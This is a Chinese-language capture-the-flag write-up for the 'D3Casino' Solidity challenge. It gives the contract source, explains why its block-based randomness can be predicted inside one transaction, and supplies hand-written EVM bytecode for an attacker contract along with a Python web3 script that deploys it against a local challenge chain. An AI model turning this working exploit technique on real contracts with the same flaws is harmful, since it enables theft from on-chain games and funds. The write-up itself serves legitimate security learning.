# D3Casino

## 源码

```js
pragma solidity 0.8.17;

contract D3Casino{
    uint256 constant mod = 17;
    uint256 constant SAFE_GAS = 10000;
    uint256 public lasttime;
    mapping(address => uint256) public scores;
    mapping(address => bool) public betrecord;
    event SendFlag();

    constructor() {
        lasttime = block.timestamp;
    }

    function bet() public {
        require(lasttime != block.timestamp, "You can only bet once per block");
        require(
            betrecord[msg.sender] == false,
            "You can only bet once per contract"
        );

        assembly {
            let size := extcodesize(caller())
            if gt(size, 0x64) { // size > 0x64 ? 1 : 0
                invalid()   //end execution with invalid instruction
            }
        }   // 合约大小要小于0x64

        lasttime = block.timestamp;
        betrecord[msg.sender] = true;
        uint256 rand = uint256(
            keccak256(
                abi.encodePacked(block.timestamp, block.difficulty, msg.sender)
            )
        ) % mod;

        uint256 value;
        bool success;
        bytes memory result;
        (success, result) = msg.sender.staticcall{gas: SAFE_GAS}("");
        require(success, "Call failed!");
        value = abi.decode(result, (uint256));

        if (rand == value) {
            uint256 score;
            for (uint i = 0; i < 20; i++) {
                if (bytes20(msg.sender)[i] == 0 && bytes20(tx.origin)[i] == 0) {
                    score++;
                }
            }
            scores[tx.origin] += score;
        } else {
            scores[tx.origin] = 0;
        }
    }

    function Solve() public {
        require(
            scores[msg.sender] >= 10,
            "You Don't Have Enough Score To Solve The Challenge"
        );
        emit SendFlag();
    }
}
```

## 题解

看到这个就想起了2022HFCTF static那题

第一想法也是手搓字节码，根据2022HFCTF static那个字节码改一改

rand伪随机数在同一笔交易里是一样的，直接算好返回即可

还有合约地址和账户地址需要有相同位置的0，这个就一直生成，比较看运气（

后来发现Minimal Proxy可能更合适一点，可以用create2创建合约，通过调整salt值完全预测部署地址，可以链下跑salt直到出现合适的合约地址再部署，而不用一直往链上部署碰运气

这里先记录一下字节码的解法，Minimal Proxy后面再复现

```
    calldatasize	//根据calldata判断是否来自题目合约的staticcall
    push1 0
    lt
    push __attack__
    jumpi
    push1 17
    ADDRESS
    push1 0x60
    shl			//因为是abi.encodePacked，所以需要左移256-160=96bits
    push1 0xc0
    mstore
    DIFFICULTY
    push1 0xa0
    mstore
    TIMESTAMP
    push1 0x80
    mstore
    push1 0x54
    push1 0x80
    sha3	//keccak256
    mod
    push __return__
    jump
__return__:
    jumpdest
    push1 0
    mstore
    push1 0x20
    push1 0
    return
__attack__:
    jumpdest
    push1 0
    push4 0x11610c25	//bet()的函数选择器
    dup2
    mstore
    dup1
    push1 4
    push1 28
    dup3
    push20  0xF767Ca67F33c10573debFb4Cd93ED6cB6D1ffbA8
    push3 0x019258
    call
    push1 1
    eq
    push __graceful__
    jumpi
    revert
__graceful__:
    jumpdest
    stop
```

python调用脚本

```python
from web3 import Web3
import requests, time

SERVER_IP  = '192.168.21.128'    # change this
GETH_PORT  = '8545'
FAUCET_PORT = '8080'

w3 = Web3(Web3.HTTPProvider(f'http://{SERVER_IP}:{GETH_PORT}')) 
assert w3.isConnected()

acc = w3.eth.account.create()
hacker, sk_hacker = acc.address, acc.key

print('[+] hacker:', hacker)
assert requests.post(f'http://{SERVER_IP}:{FAUCET_PORT}/api/claim', data = {'address': hacker}).status_code == 200
print('[+] waiting for test ether')
while w3.eth.get_balance(hacker) == 0:
    time.sleep(5)
print('[+] exploit start')

def get_txn(src, dst, data, value=0):
    return {
        "chainId": w3.eth.chain_id,
        "from": src,
        "to": dst,
        "gasPrice": w3.toWei(1,'gwei'),
        "gas": 4700000,
        "value": w3.toWei(value,'ether'),
        "nonce": w3.eth.getTransactionCount(src),
        "data": data
    }

def deploy(src, data, value=0):
    return {
        "chainId": w3.eth.chain_id,
        "from": src,
        "gasPrice": w3.toWei(1,'gwei'),
        "gas": 4700000,
        "value": w3.toWei(value,'ether'),
        "nonce": w3.eth.getTransactionCount(src),
        "data": data
    }

length = "5d"
init_code = "60" + length + "600d60003960" + length + "6000f300"
run_code = "36600010602a5760113060601b60c0524460a052426080526054608020066021565b60005260206000f35b60006311610c258152806004601c8273f767ca67f33c10573debfb4cd93ed6cb6d1ffba862019258f1600114605b57fd5b00"
bytecode = init_code + run_code

signed_txn = w3.eth.account.sign_transaction(deploy(hacker, bytecode), sk_hacker)
print(signed_txn)
txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()
txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)
assert txn_receipt['status'] == 1
target = txn_receipt['contractAddress']
print('[+] attacker address:', target)

data = b'\x11'
signed_txn = w3.eth.account.signTransaction(get_txn(hacker, target, data), sk_hacker)
txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()
txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)
assert txn_receipt['status'] == 1
print('[+] exploited, tx_hash:', txn_receipt['transactionHash'].hex())
```

